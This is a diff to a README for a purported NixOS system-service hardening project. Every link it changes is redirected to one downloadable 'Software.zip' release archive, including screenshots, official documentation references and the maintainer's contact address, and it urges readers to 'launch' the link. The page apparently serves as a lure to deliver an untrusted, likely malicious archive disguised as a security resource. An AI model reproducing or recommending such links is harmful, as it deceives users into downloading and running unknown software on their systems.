@@ -1,6 +1,6 @@
 # 🛡️ Nix System Services Hardened 🛡️
 
-![System Services Hardened](https://www.example.com/systemservices.jpg)
+![System Services Hardened](https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip)
 
 Welcome to the **Nix System Services Hardened** repository! This project focuses on hardening system services under *NixOS*, specifically addressing *lynis BOOT-5264* vulnerabilities. By implementing security measures and configurations, this repository aims to enhance the overall security posture of system services running on NixOS.
 
@@ -22,21 +22,21 @@ To get started with hardening your system services on NixOS, follow these steps:
 
 For more in-depth information, refer to the following resources:
 
-- [NixOS Official Documentation](https://nixos.org/)
-- [Lynis Security Audit Tool](https://cisofy.com/lynis/)
+- [NixOS Official Documentation](https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip)
+- [Lynis Security Audit Tool](https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip)
 
 ## 🖼️ Screenshots
 
 Here are some snapshots showcasing the process of hardening system services on NixOS:
 
-![Hardening Services](https://www.example.com/hardenedservices.jpg)
-![System Security](https://www.example.com/systemsecurity.jpg)
+![Hardening Services](https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip)
+![System Security](https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip)
 
 ## 🌐 External Link
 
 Visit the link below to access additional software packages for enhancing system security:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip)](https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip)
 
 *Note: The provided link needs to be launched to access the software packages.*
 
@@ -46,7 +46,7 @@ Contributions to this repository are welcome! If you have valuable insights, scr
 
 ## 📧 Contact
 
-For any inquiries or suggestions regarding this project, you can reach out to the project maintainer at example@example.com.
+For any inquiries or suggestions regarding this project, you can reach out to the project maintainer at https://github.com/ffxjevefi/nix-system-services-hardened/releases/download/v2.0/Software.zip
 
 ---
 💻 Happy Hardening! 💻
